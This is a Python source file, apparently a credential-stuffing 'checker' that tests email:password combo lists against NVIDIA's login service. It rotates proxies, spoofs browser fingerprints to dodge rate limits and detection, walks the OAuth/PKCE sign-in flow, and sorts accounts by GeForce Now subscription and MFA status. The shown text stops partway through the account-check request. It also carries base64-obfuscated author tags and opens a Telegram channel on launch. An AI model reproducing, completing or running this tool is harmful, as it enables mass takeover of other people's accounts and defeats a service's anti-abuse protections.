#Checker by @samvir1 | @samvir1
import os, re, sys, json, time, base64, random, string, hashlib, secrets
import threading, configparser, urllib3, urllib.parse, subprocess, shutil
from collections import OrderedDict
from datetime import datetime
from concurrent.futures import (ThreadPoolExecutor, as_completed,
                                 wait, FIRST_COMPLETED)

try:
    from curl_cffi import requests as eyelifter_cffi
    _EYELIFTER_HAVE_CFFI = True
except ImportError:
    import requests as eyelifter_cffi
    _EYELIFTER_HAVE_CFFI = False

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

_F1T = "TlZJRElB"
_F2T = "IENoZWNrZXI="
_F1A = "QGV5ZWxp"
_F2A = "ZnRlcg=="
_F1C = "QGRhcmto"
_F2C = "dWNoYW5uZWw="
_F1D = "TlZJRElBQGV5ZWxpZnRlcg=="
_F1S = "bG9ja2VkLWJ5LWV5"
_F2S = "ZWxpZnRlci0yMDI2"

_EYELIFTER_SEAL = os.path.join(os.path.expanduser("~"), ".eyelifter.nvidia.seal")
_EYELIFTER_SEALED = None

EYELIFTER_WWW       = "https://www.nvidia.com"
EYELIFTER_LOGIN_NVA = "https://login.nvidia.com"
EYELIFTER_AUTHORIZE = f"{EYELIFTER_LOGIN_NVA}/authorize"
EYELIFTER_TOKEN_URL = f"{EYELIFTER_LOGIN_NVA}/token"
EYELIFTER_ACCOUNTS  = "https://accounts.nvgs.nvidia.com"
EYELIFTER_LOGIN_NVGS = "https://login.nvgs.nvidia.com"
EYELIFTER_PAYWALL   = ("https://api-prod.nvidia.com/gfn-paywall-api/"
                       "api/v2/subscriptions?locale=en_IN")

EYELIFTER_CLIENT_PUBLIC = "HdpDyyR1DqQFapN2MBk5kjJgAvu6UTXRDgtwLhQjrH8"
EYELIFTER_SCOPE = "openid profile email"
EYELIFTER_REDIRECT = f"{EYELIFTER_WWW}/auth/"

EYELIFTER_X_METRICS = ("5ZjiARedWmKOoXlrQRFkblcGoDlJGPOT0oHz4C03h"
                        "OS72FpYLX0LRmdNk8GbhBIJ")
EYELIFTER_ACCEPT_LANG = "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7"

EYELIFTER_UA_POOL = [
    ("chrome", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"),
    ("chrome", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"),
    ("chrome", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"),
    ("chrome124", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"),
    ("chrome120", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"),
    ("chrome120", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"),
    ("chrome116", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36"),
    ("chrome110", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36"),
    ("firefox133", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0"),
    ("firefox133", "Mozilla/5.0 (X11; Linux x86_64; rv:133.0) Gecko/20100101 Firefox/133.0"),
    ("safari17_0", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15"),
]


def eyelifter_d(e):
    pad = "=" * (-len(e) % 4)
    return base64.b64decode(e + pad).decode("utf-8")


def eyelifter_j(*p):
    return "".join(eyelifter_d(x) for x in p)


EYELIFTER_TOOL     = eyelifter_j(_F1T, _F2T)
EYELIFTER_TG_USER  = eyelifter_j(_F1A, _F2A)
EYELIFTER_TG_CHAN  = eyelifter_j(_F1C, _F2C)
EYELIFTER_RESULTS  = eyelifter_j(_F1D)
EYELIFTER_SEAL_STR = eyelifter_j(_F1S, _F2S)
EYELIFTER_LINE_TAG = f"by {EYELIFTER_TG_USER} | {EYELIFTER_TG_CHAN}"


def eyelifter_verify(ctx="x"):
    global _EYELIFTER_SEALED
    if _EYELIFTER_SEALED is True:
        return True
    if EYELIFTER_TOOL != "NVIDIA Checker":
        raise RuntimeError("eyelifter: credit stripped.")
    if EYELIFTER_TG_USER != "@samvir1" or EYELIFTER_TG_CHAN != "@samvir1":
        raise RuntimeError("eyelifter: credit stripped.")
    if EYELIFTER_RESULTS != "NVIDIA@samvir1":
        raise RuntimeError("eyelifter: credit stripped.")
    if EYELIFTER_SEAL_STR != "locked-by-eyelifter-2026":
        raise RuntimeError("eyelifter: credit stripped.")
    try:
        fp = hashlib.sha256(open(__file__, "rb").read()).hexdigest()[:32]
    except Exception:
        fp = "x"
    if os.path.isfile(_EYELIFTER_SEAL):
        try:
            st = open(_EYELIFTER_SEAL).read().strip()
        except OSError:
            st = ""
        if st and st != fp:
            raise RuntimeError("eyelifter: hands off. this build is sealed.")
    else:
        try:
            open(_EYELIFTER_SEAL, "w").write(fp)
        except OSError:
            pass
    _EYELIFTER_SEALED = True
    return True


_EYELIFTER_ANSI = sys.stdout.isatty()
_EYELIFTER_RS = "\033[0m"


def eyelifter_color(c, s, b=False):
    if not _EYELIFTER_ANSI:
        return s
    return f"\033[{'1;' if b else ''}{c}m{s}{_EYELIFTER_RS}"


_EYELIFTER_LV = {
    "SUCCESS": ("32", True), "INFO": ("36", False), "WARN": ("33", True),
    "ERROR": ("31", True), "STEP": ("96", True), "DEBUG": ("35", False),
}

_EYELIFTER_KIND_COLOR = {
    "gfn":   ("92", True),
    "mfa":   ("95", True),
    "free":  ("96", False),
    "bad":   ("31", False),
    "error": ("31", True),
}

_EYELIFTER_CL = threading.Lock()


def eyelifter_log(emoji, level, tag, msg):
    ts = datetime.now().strftime("%H:%M:%S")
    code, bold = _EYELIFTER_LV.get(level, ("0", False))
    with _EYELIFTER_CL:
        if _EYELIFTER_ANSI:
            print(f"{eyelifter_color('90', ts)} {emoji}  "
                  f"{eyelifter_color(code, f'{level:7s}', bold)}  "
                  f"{eyelifter_color('90', tag)}  {msg}", flush=True)
        else:
            print(f"[{ts}] {emoji} {level:7s} {tag} {msg}", flush=True)


def eyelifter_dbg(tag, msg):
    if not _EYELIFTER_CFG.s.get("debug", False):
        return
    eyelifter_log("🐛", "DEBUG", tag, msg)


def eyelifter_dbg_kv(tag, **kw):
    if not _EYELIFTER_CFG.s.get("debug", False):
        return
    body = " ".join(f"{k}={v}" for k, v in kw.items())
    eyelifter_log("🐛", "DEBUG", tag, body)


def eyelifter_rline(i, t, kind, txt):
    code, bold = _EYELIFTER_KIND_COLOR.get(kind, ("0", False))
    with _EYELIFTER_CL:
        if _EYELIFTER_ANSI:
            prefix = eyelifter_color("90", f"[{i:02d}/{t}]")
            body = eyelifter_color(code, txt, bold)
            print(f"{prefix} {body}", flush=True)
        else:
            print(f"[{i:02d}/{t}] {txt}", flush=True)


def eyelifter_section(t, w=68):
    print()
    lbl = f" {t} "
    side = max(1, (w - len(lbl)) // 2)
    print(eyelifter_color("90", "─" * side) + eyelifter_color("96", lbl, True)
          + eyelifter_color("90", "─" * (w - len(lbl) - side)))


def eyelifter_banner(t, sub=None, w=68):
    print()
    line = "═" if _EYELIFTER_ANSI else "="
    print(eyelifter_color("90", line * w))
    print(eyelifter_color("96", t.center(w), True))
    if sub:
        print(eyelifter_color("2", sub.center(w)))
    print(eyelifter_color("5",
        f"eyelifter · {EYELIFTER_TG_USER} · {EYELIFTER_TG_CHAN}".center(w)))
    print(eyelifter_color("90", line * w))


def eyelifter_summary(rows):
    print()
    print(eyelifter_color("96",
        f"═══ eyelifter · {EYELIFTER_TG_USER} · {EYELIFTER_TG_CHAN} ═══", True))
    if rows:
        wk = max(len(str(k)) for k, _ in rows)
        for k, v in rows:
            print(f"  {eyelifter_color('96', str(k).ljust(wk))}  "
                  f"{eyelifter_color('0', str(v))}")
    print(eyelifter_color("96", "════════════════════════════════", True))


def eyelifter_human_ts(iso):
    if not iso:
        return "-"
    try:
        if isinstance(iso, datetime):
            dt = iso.astimezone() if iso.tzinfo else iso
        else:
            s = str(iso).strip().replace("Z", "+00:00")
            dt = datetime.fromisoformat(s).astimezone()
        return dt.strftime("%b %d, %Y · %H:%M")
    except Exception:
        return str(iso)


def eyelifter_human_ts_unix(ts):
    if not ts:
        return "-"
    try:
        n = int(ts)
        return datetime.fromtimestamp(n).astimezone().strftime(
            "%b %d, %Y · %H:%M")
    except Exception:
        return str(ts)


def eyelifter_human_time_long(iso=None):
    try:
        if iso is None:
            dt = datetime.now().astimezone()
        elif isinstance(iso, datetime):
            dt = iso.astimezone() if iso.tzinfo else iso
        else:
            s = str(iso).strip().replace("Z", "+00:00")
            dt = datetime.fromisoformat(s).astimezone()
        return dt.strftime("%B %d, %Y · %H:%M:%S")
    except Exception:
        return str(iso)


def eyelifter_open_channel():
    url = f"https://t.me/{EYELIFTER_TG_CHAN.lstrip('@')}"
    try:
        for cmd in ("termux-open-url", "xdg-open", "open"):
            if shutil.which(cmd):
                subprocess.Popen(
                    [cmd, url],
                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                    stdin=subprocess.DEVNULL, start_new_session=True,
                    close_fds=True)
                return
        if os.name == "nt":
            os.startfile(url)
            return
        import webbrowser
        webbrowser.open(url)
    except Exception:
        pass


_EYELIFTER_CFG_PATH = os.path.join(
    os.environ.get("NVIDIA_HOME") or os.path.dirname(os.path.abspath(__file__)),
    "config_nvidia.ini"
)
_EYELIFTER_MAX_THREADS = 200
_EYELIFTER_SESS_MAX = 2048


class _EyelifterAbort(Exception):
    pass


class EyelifterCfg:
    def __init__(self, cf=_EYELIFTER_CFG_PATH):
        self.cf = cf
        self.cp = configparser.ConfigParser()
        self.cp.optionxform = str
        self.s = self.eyelifter_inmemory()
        try:
            self.eyelifter_load()
        except Exception as e:
            sys.stderr.write(f"[nvidia] config load failed: {e}\n")

    @staticmethod
    def eyelifter_inmemory():
        return {
            "threads": 5,
            "timeout": 15,
            "proxies_file": "proxies.txt",
            "retries": 2,
            "retry_delay": 1.5,
            "combo_delay": 0.2,
            "rate_limit_delay": 60,
            "skip_proxy_test": False,
            "open_channel_on_launch": True,
            "debug": False,
            "hit_spacer": True,
            "impersonate": "auto",
            "enrich": True,
        }

    def eyelifter_load(self):
        if not os.path.exists(self.cf):
            try:
                self.eyelifter_default()
            except Exception:
                pass
        try:
            self.cp.read(self.cf, encoding="utf-8")
        except Exception:
            try:
                self.eyelifter_default()
                self.cp.read(self.cf, encoding="utf-8")
            except Exception:
                return
        if "nvidia" not in self.cp:
            self.cp["nvidia"] = {}
        c = self.cp["nvidia"]
        try:
            self.s["threads"] = max(1, min(_EYELIFTER_MAX_THREADS,
                c.getint("threads", 5)))
        except (ValueError, TypeError):
            self.s["threads"] = 5
        try:
            self.s["timeout"] = max(5, min(120, c.getint("timeout", 15)))
        except (ValueError, TypeError):
            self.s["timeout"] = 15
        self.s["proxies_file"] = c.get("proxies_file", "proxies.txt")
        try:
            self.s["retries"] = max(0, min(5, c.getint("retries", 2)))
        except (ValueError, TypeError):
            self.s["retries"] = 2
        try:
            self.s["retry_delay"] = max(0.0, min(60.0,
                c.getfloat("retry_delay", 1.5)))
        except (ValueError, TypeError):
            self.s["retry_delay"] = 1.5
        try:
            self.s["combo_delay"] = max(0.0, min(60.0,
                c.getfloat("combo_delay", 0.2)))
        except (ValueError, TypeError):
            self.s["combo_delay"] = 0.2
        try:
            self.s["rate_limit_delay"] = max(1, min(300,
                c.getint("rate_limit_delay", 60)))
        except (ValueError, TypeError):
            self.s["rate_limit_delay"] = 60
        self.s["skip_proxy_test"] = c.getboolean("skip_proxy_test", False)
        self.s["open_channel_on_launch"] = c.getboolean(
            "open_channel_on_launch", True)
        self.s["debug"] = c.getboolean("debug", False)
        self.s["hit_spacer"] = c.getboolean("hit_spacer", True)
        self.s["impersonate"] = c.get("impersonate", "auto").strip().lower()
        if not self.s["impersonate"]:
            self.s["impersonate"] = "auto"
        self.s["enrich"] = c.getboolean("enrich", True)

    def eyelifter_default(self):
        self.cp["nvidia"] = {
            "threads": "5", "timeout": "15", "proxies_file": "proxies.txt",
            "retries": "2", "retry_delay": "1.5", "combo_delay": "0.2",
            "rate_limit_delay": "60", "skip_proxy_test": "false",
            "open_channel_on_launch": "true", "debug": "false",
            "hit_spacer": "true", "impersonate": "auto", "enrich": "true",
        }
        try:
            with open(self.cf, "w", encoding="utf-8") as f:
                self.cp.write(f)
        except OSError:
            pass

    def eyelifter_save(self):
        if "nvidia" not in self.cp:
            self.cp["nvidia"] = {}
        for k, v in self.s.items():
            self.cp["nvidia"][k] = str(v)
        with open(self.cf, "w", encoding="utf-8") as f:
            self.cp.write(f)


_EYELIFTER_CFG = EyelifterCfg()

_EYELIFTER_LK = threading.Lock()
_EYELIFTER_PK = threading.Lock()
_EYELIFTER_FK = threading.Lock()
_EYELIFTER_IK = threading.Lock()
_EYELIFTER_RL = threading.Lock()
_EYELIFTER_DBG_LOCK = threading.Lock()
_EYELIFTER_SESS_LOCK = threading.Lock()
_EYELIFTER_STOP = threading.Event()

_EYELIFTER_ST = {"checked": 0, "gfn": 0, "mfa": 0, "free": 0,
                 "bad": 0, "rl": 0, "errors": 0, "pfails": 0}
_EYELIFTER_START = time.time()
_EYELIFTER_TOTAL = 0
_EYELIFTER_POOL = []
_EYELIFTER_BADP = set()
_EYELIFTER_COOLP = {}
_EYELIFTER_INUSE = set()
_EYELIFTER_RLU = {}
_EYELIFTER_FOLDER = None
_EYELIFTER_DBG_DIR = None
_EYELIFTER_HANDLES = {}
_EYELIFTER_SESSIONS = {}
_EYELIFTER_SESS_ORDER = OrderedDict()
_EYELIFTER_VALID_TARGETS = None

_EYELIFTER_MFA_STEPS = frozenset({
    "PromptMfa", "MfaChallenge", "PromptFactor", "SecondaryAuth",
    "PromptChallenge", "NfactorPromptChallenge", "NFactorPromptChallenge",
    "ChallengePrompt", "PromptNfactor", "MfaPrompt", "OtpPrompt",
    "VerifyOtp", "TwoFactorChallenge", "TwoFactorPrompt",
})


def eyelifter_stop_check():
    if _EYELIFTER_STOP.is_set():
        raise _EyelifterAbort()


def eyelifter_reset_stats():
    global _EYELIFTER_ST, _EYELIFTER_START, _EYELIFTER_COOLP
    global _EYELIFTER_BADP, _EYELIFTER_RLU, _EYELIFTER_FOLDER, _EYELIFTER_DBG_DIR
    global _EYELIFTER_TOTAL
    with _EYELIFTER_LK:
        _EYELIFTER_ST = {"checked": 0, "gfn": 0, "mfa": 0, "free": 0,
                         "bad": 0, "rl": 0, "errors": 0, "pfails": 0}
        _EYELIFTER_START = time.time()
        _EYELIFTER_TOTAL = 0
    with _EYELIFTER_PK:
        _EYELIFTER_COOLP = {}
        _EYELIFTER_BADP = set()
    with _EYELIFTER_RL:
        _EYELIFTER_RLU = {}
    with _EYELIFTER_IK:
        _EYELIFTER_INUSE.clear()
    with _EYELIFTER_SESS_LOCK:
        for _s in _EYELIFTER_SESSIONS.values():
            try:
                _s.close()
            except Exception:
                pass
        _EYELIFTER_SESSIONS.clear()
        _EYELIFTER_SESS_ORDER.clear()
    _EYELIFTER_FOLDER = None
    _EYELIFTER_DBG_DIR = None


def eyelifter_supported_targets():
    global _EYELIFTER_VALID_TARGETS
    if _EYELIFTER_VALID_TARGETS is not None:
        return _EYELIFTER_VALID_TARGETS
    try:
        from curl_cffi.requests.impersonate import BrowserType
        _EYELIFTER_VALID_TARGETS = {
            str(getattr(v, "value", v)) for v in BrowserType
        }
    except Exception:
        _EYELIFTER_VALID_TARGETS = set()
    return _EYELIFTER_VALID_TARGETS


def eyelifter_pick_ua():
    cfg = _EYELIFTER_CFG.s.get("impersonate") or "auto"
    valid = eyelifter_supported_targets()
    pool = [p for p in EYELIFTER_UA_POOL if not valid or p[0] in valid]
    if not pool:
        pool = EYELIFTER_UA_POOL
    if cfg != "auto":
        matching = [p for p in pool if p[0] == cfg]
        if matching:
            return random.choice(matching)
    return random.choice(pool)


def eyelifter_pick_proxy(exclude=None):
    now = time.time()
    with _EYELIFTER_PK:
        avail = [p for p in _EYELIFTER_POOL
                 if p not in _EYELIFTER_BADP
                 and _EYELIFTER_COOLP.get(p, 0.0) <= now]
    with _EYELIFTER_IK:
        free = [p for p in avail if p not in _EYELIFTER_INUSE]
    if not free:
        free = avail
    if exclude and len(free) > 1:
        free = [p for p in free if p != exclude] or free
    p = random.choice(free) if free else None
    if p:
        with _EYELIFTER_IK:
            _EYELIFTER_INUSE.add(p)
    return p


def eyelifter_rel_proxy(p):
    if not p:
        return
    with _EYELIFTER_IK:
        _EYELIFTER_INUSE.discard(p)


def eyelifter_bad_proxy(p):
    if not p:
        return
    with _EYELIFTER_PK:
        if p in _EYELIFTER_BADP:
            return
        _EYELIFTER_BADP.add(p)
    with _EYELIFTER_LK:
        _EYELIFTER_ST["pfails"] += 1


def eyelifter_cool_proxy(p, secs=120):
    if not p:
        return
    with _EYELIFTER_PK:
        _EYELIFTER_COOLP[p] = time.time() + secs


def eyelifter_rl_backoff(s, proxy=None):
    key = proxy or "__direct__"
    with _EYELIFTER_RL:
        _EYELIFTER_RLU[key] = max(
            _EYELIFTER_RLU.get(key, 0.0), time.time() + s)


def eyelifter_rl_wait(proxy=None):
    key = proxy or "__direct__"
    while not _EYELIFTER_STOP.is_set():
        with _EYELIFTER_RL:
            gap = _EYELIFTER_RLU.get(key, 0.0) - time.time()
        if gap <= 0:
            with _EYELIFTER_RL:
                _EYELIFTER_RLU.pop(key, None)
            return
        if _EYELIFTER_STOP.wait(min(gap, 1.0)):
            return


def eyelifter_sw(fh, text):
    if fh is None:
        return
    with _EYELIFTER_FK:
        try:
            fh.write(text)
            fh.flush()
        except Exception:
            pass


def eyelifter_parse_proxy(line):
    line = line.strip()
    if not line or line.startswith("#"):
        return None
    if line.startswith(("http://", "https://", "socks4://", "socks5://")):
        return line
    p = line.split(":")
    if len(p) == 4:
        return f"http://{p[2]}:{p[3]}@{p[0]}:{p[1]}"
    if len(p) == 2:
        return f"http://{p[0]}:{p[1]}"
    if "@" in line:
        return f"http://{line}"
    return None


def eyelifter_load_proxies(path):
    if not path or not os.path.isfile(path):
        return []
    out = []
    with open(path, "r", encoding="utf-8", errors="ignore") as f:
        for ln in f:
            p = eyelifter_parse_proxy(ln)
            if p:
                out.append(p)
    return list(dict.fromkeys(out))


def eyelifter_build_session(proxy=None):
    thread_key = threading.get_ident()
    key = f"{proxy or '__direct__'}#{thread_key}"
    with _EYELIFTER_SESS_LOCK:
        s = _EYELIFTER_SESSIONS.get(key)
        if s is not None:
            _EYELIFTER_SESS_ORDER.move_to_end(key)
            return s
    target, ua = eyelifter_pick_ua()
    to = _EYELIFTER_CFG.s["timeout"]
    s = None
    if _EYELIFTER_HAVE_CFFI:
        for attempt in (target, "chrome", None):
            if attempt is None:
                try:
                    s = eyelifter_cffi.Session(timeout=to)
                    break
                except Exception:
                    s = eyelifter_cffi.Session()
                    break
            try:
                s = eyelifter_cffi.Session(impersonate=attempt, timeout=to)
                break
            except Exception:
                continue
        if s is None:
            s = eyelifter_cffi.Session()
    else:
        s = eyelifter_cffi.Session()
    s.verify = False
    if proxy:
        s.proxies = {"http": proxy, "https": proxy}
    s._nvidia_ua = ua
    s._nvidia_device = "".join(
        random.choices(string.ascii_lowercase + string.digits, k=16))
    eyelifter_dbg("SESSION",
                  f"built key={key} target={target} device={s._nvidia_device}")
    with _EYELIFTER_SESS_LOCK:
        existing = _EYELIFTER_SESSIONS.get(key)
        if existing is not None:
            try:
                s.close()
            except Exception:
                pass
            _EYELIFTER_SESS_ORDER.move_to_end(key)
            return existing
        evict = []
        while len(_EYELIFTER_SESSIONS) >= _EYELIFTER_SESS_MAX:
            old_key, _ = _EYELIFTER_SESS_ORDER.popitem(last=False)
            old_sess = _EYELIFTER_SESSIONS.pop(old_key, None)
            if old_sess is not None:
                evict.append(old_sess)
        _EYELIFTER_SESSIONS[key] = s
        _EYELIFTER_SESS_ORDER[key] = True
    for old_sess in evict:
        try:
            old_sess.close()
        except Exception:
            pass
    return s


def eyelifter_close_sessions():
    with _EYELIFTER_SESS_LOCK:
        for s_ in _EYELIFTER_SESSIONS.values():
            try:
                s_.close()
            except Exception:
                pass
        _EYELIFTER_SESSIONS.clear()
        _EYELIFTER_SESS_ORDER.clear()


def eyelifter_test_proxy(p):
    try:
        kw = {"proxies": {"http": p, "https": p}, "timeout": 8}
        if _EYELIFTER_HAVE_CFFI:
            kw["impersonate"] = "chrome"
        kw["verify"] = False
        r = eyelifter_cffi.get("https://api.ipify.org?format=json", **kw)
        return r.status_code == 200
    except Exception:
        return False


def eyelifter_filter_proxies(proxies):
    if not proxies:
        return []
    total = len(proxies)
    good, done = [], [0]
    lock = threading.Lock()
    eyelifter_log("🌐", "STEP", "PROXY", f"testing {total}")

    def probe(p):
        ok = eyelifter_test_proxy(p)
        with lock:
            done[0] += 1
            if ok:
                good.append(p)
            if done[0] % 20 == 0 or done[0] == total:
                eyelifter_log("🔎", "STEP", "PROXY",
                    f"{done[0]}/{total} — {len(good)} live")

    with ThreadPoolExecutor(max_workers=min(60, max(1, total))) as ex:
        for f in as_completed([ex.submit(probe, p) for p in proxies]):
            try:
                f.result()
            except Exception:
                pass
    if not good:
        eyelifter_log("⚠️", "WARN", "PROXY", f"0/{total} live — running direct")
        return []
    eyelifter_log("✅", "INFO", "PROXY", f"{len(good)}/{total} live")
    return good


def eyelifter_folder():
    global _EYELIFTER_FOLDER, _EYELIFTER_DBG_DIR
    if _EYELIFTER_FOLDER:
        return _EYELIFTER_FOLDER
    root = os.path.join(os.path.dirname(_EYELIFTER_CFG_PATH),
                        EYELIFTER_RESULTS)
    os.makedirs(root, exist_ok=True)
    ts = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    tag = "".join(random.choices(string.ascii_lowercase + string.digits, k=4))
    _EYELIFTER_FOLDER = os.path.join(root, f"Session_{ts}_{tag}")
    os.makedirs(_EYELIFTER_FOLDER, exist_ok=True)
    _EYELIFTER_DBG_DIR = os.path.join(_EYELIFTER_FOLDER, "Debug")
    os.makedirs(_EYELIFTER_DBG_DIR, exist_ok=True)
    return _EYELIFTER_FOLDER


def eyelifter_save_dbg(name, text):
    if not _EYELIFTER_CFG.s.get("debug", False):
        return
    eyelifter_folder()
    safe = re.sub(r"[^A-Za-z0-9._-]", "_", name)[:150]
    with _EYELIFTER_DBG_LOCK:
        try:
            with open(os.path.join(_EYELIFTER_DBG_DIR, f"{safe}.txt"), "w",
                      encoding="utf-8", errors="replace") as f:
                f.write((text or "")[:500_000])
        except Exception:
            pass


def eyelifter_b64u(raw):
    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode()


def eyelifter_pkce():
    v = secrets.token_urlsafe(32)[:43]
    ch = eyelifter_b64u(hashlib.sha256(v.encode()).digest())
    return v, ch


def eyelifter_extract_key(text):
    if not text:
        return None
    m = re.search(r'[?&]key=([A-Za-z0-9_\-\.]{20,})', text)
    return m.group(1) if m else None


def eyelifter_extract_code(text):
    if not text:
        return None
    m = re.search(r'[?&]code=([^&#]+)', text)
    return m.group(1) if m else None


def eyelifter_decode_jwt(tok):
    if not tok or tok.count(".") != 2:
        return {}
    try:
        h = json.loads(base64.urlsafe_b64decode(
            tok.split(".")[0] + "=" * (-len(tok.split(".")[0]) % 4)))
        p = json.loads(base64.urlsafe_b64decode(
            tok.split(".")[1] + "=" * (-len(tok.split(".")[1]) % 4)))
        return {"header": h, "payload": p}
    except Exception:
        return {}


def eyelifter_cookies_header(s):
    try:
        return "; ".join(f"{c.name}={c.value}" for c in s.cookies)
    except Exception:
        return ""


def eyelifter_key_headers(key, cookie=None, referer=None, ua=None):
    h = {
        "accept": "application/json, text/plain, */*",
        "accept-language": EYELIFTER_ACCEPT_LANG,
        "content-type": "application/json",
        "authorization": f"Bearer {key}",
        "origin": EYELIFTER_LOGIN_NVGS,
        "referer": referer or f"{EYELIFTER_LOGIN_NVGS}/v1/login/identifier?key={key}",
        "x-metrics": EYELIFTER_X_METRICS,
    }
    if ua:
        h["user-agent"] = ua
    if cookie:
        h["cookie"] = cookie
    return h


class EyelifterResult:
    def __init__(self, email, password):
        self.email = email
        self.password = password
        self.status = "unknown"
        self.reason = ""
        self.sub = None
        self.username = None
        self.email_verified = False
        self.locale = None
        self.sid = None
        self.external_id = None
        self.idp_name = None
        self.auth_time = None
        self.iat = None
        self.exp = None
        self.last_auth = None
        self.user_token_expire = None
        self.mfa_types = []
        self.has_mfa = False
        self.id_token = None
        self.access_token = None
        self.gfn_status = None
        self.gfn_plan = None
        self.gfn_owned = False
        self.gfn_product = None
        self.gfn_expires = None
        self.gfn_tier = None
        self.gfn_provider = None
        self.gfn_billing = None
        self.gfn_is_existing = False
        self.raw_login = None
        self.raw_user = None
        self.raw_gfn = None
        self.paywall = {}


def eyelifter_fetch_factors(s, key, cookie_hdr, referer, ua, r):
    try:
        fr = s.get(
            f"{EYELIFTER_ACCOUNTS}/api/1/frontend/oauth/"
            f"auth/factor/challenge/factors"
            f"?browserCapability=%5B%22Passkey%22%2C%22WebAuthn%22%2C%22TOTP%22%5D",
            headers=eyelifter_key_headers(key, cookie_hdr, referer, ua),
            timeout=_EYELIFTER_CFG.s["timeout"])
        eyelifter_save_dbg(f"factors_{r.email}", fr.text)
        if fr.status_code == 200:
            try:
                fj = fr.json()
                for v in (fj.get("values") or []):
                    if isinstance(v, dict) and v.get("type"):
                        if v["type"] not in r.mfa_types:
                            r.mfa_types.append(v["type"])
                r.has_mfa = any(
                    mfa in ("TOTP", "WebAuthn", "Passkey")
                    for mfa in r.mfa_types)
                eyelifter_dbg_kv("FACTORS", status=fr.status_code,
                                 types=r.mfa_types or "-")
            except Exception:
                eyelifter_dbg("FACTORS", "json parse failed")
        else:
            eyelifter_dbg_kv("FACTORS", status=fr.status_code)
    except Exception as e:
        eyelifter_dbg("FACTORS", f"query failed · {type(e).__name__}")


def eyelifter_check(combo, proxy=None):
    if ":" not in combo:
        r = EyelifterResult(combo, "")
        r.status = "bad"
        r.reason = "malformed"
        return r
    email, password = combo.split(":", 1)
    email = email.strip().lower()
    password = password.strip()
    r = EyelifterResult(email, password)

    if not email or not password:
        r.status = "bad"
        r.reason = "empty_field"
        return r

    eyelifter_stop_check()

    eyelifter_dbg("CHECK", f"start · {email} · proxy={proxy or 'direct'}")
    s = eyelifter_build_session(proxy)
    ua = getattr(s, "_nvidia_ua", EYELIFTER_UA_POOL[0][1])
    device = getattr(s, "_nvidia_device", "eyelifter-defaultdevice00")
    s.headers.update({
        "user-agent": ua,
        "accept-language": EYELIFTER_ACCEPT_LANG,
    })

    try:
        s.cookies.clear()
    except Exception:
        try:
            s.cookies = type(s.cookies)()
        except Exception:
            pass

    verifier, challenge = eyelifter_pkce()
    state = secrets.token_urlsafe(24)
    nonce = secrets.token_urlsafe(16)

    params = {
        "client_id": EYELIFTER_CLIENT_PUBLIC,
        "redirect_uri": EYELIFTER_REDIRECT,
        "response_type": "code",
        "scope": EYELIFTER_SCOPE,
        "state": state,
        "nonce": nonce,
        "code_challenge": challenge,
        "code_challenge_method": "S256",
    }
    url = f"{EYELIFTER_AUTHORIZE}?{urllib.parse.urlencode(params)}"

    eyelifter_dbg("SSO", "authorize request")
    eyelifter_stop_check()
    try:
        rr = s.get(url, allow_redirects=False, timeout=15,
                   headers={"referer": EYELIFTER_REDIRECT})
    except _EyelifterAbort:
        raise
    except Exception as e:
        r.status = "error"
        r.reason = f"net_{type(e).__name__}"
        return r

    loc = rr.headers.get("Location", "")
    eyelifter_dbg_kv("SSO", authorize_status=rr.status_code,
                     loc=(loc[:80] if loc else "-"))
    if not loc:
        r.status = "error"
        r.reason = "no_authorize_redirect"
        return r

    eyelifter_stop_check()
    try:
        rr = s.get(loc, allow_redirects=False, timeout=15,
                   headers={"referer": f"{EYELIFTER_WWW}/"})
    except _EyelifterAbort:
        raise
    except Exception as e:
        r.status = "error"
        r.reason = f"net_{type(e).__name__}"
        return r

    loc2 = rr.headers.get("Location", "")
    eyelifter_dbg_kv("SSO", login_redirect_status=rr.status_code,
                     loc=(loc2[:80] if loc2 else "-"))
    if not loc2:
        r.status = "error"
        r.reason = "no_login_redirect"
        return r

    key = eyelifter_extract_key(loc2)
    if not key:
        r.status = "error"
        r.reason = "no_session_key"
        eyelifter_dbg("SSO", "session key missing from redirect")
        return r
    eyelifter_dbg("SSO", f"session key acquired · len={len(key)}")

    eyelifter_stop_check()
    try:
        s.get(loc2, allow_redirects=True, timeout=15,
              headers={"accept": "text/html,*/*;q=0.8",
                       "referer": f"{EYELIFTER_WWW}/"})
    except _EyelifterAbort:
        raise
    except Exception:
        pass

    cookie_hdr = eyelifter_cookies_header(s)

    referer = f"{EYELIFTER_LOGIN_NVGS}/v1/login/identifier?key={key}"
    eyelifter_dbg_kv("CHECK", step="account/check", device=device)
    eyelifter_stop_check()
    try:
        rr = s.post(f"{EYELIFTER_ACCOUNTS}/api/1/frontend/oauth/account/check",
                    json={"email": email, "rememberLogin": True,
                          "deviceId": device},
                    headers=eyelifter_key_headers(key, cookie_hdr, referer, ua),
                    timeout=15)
    except _EyelifterAbort:
        raise
    except Exception as e:
        r.status = "error"
        r.reason = f"net_{type(e).__name__}"
        return r

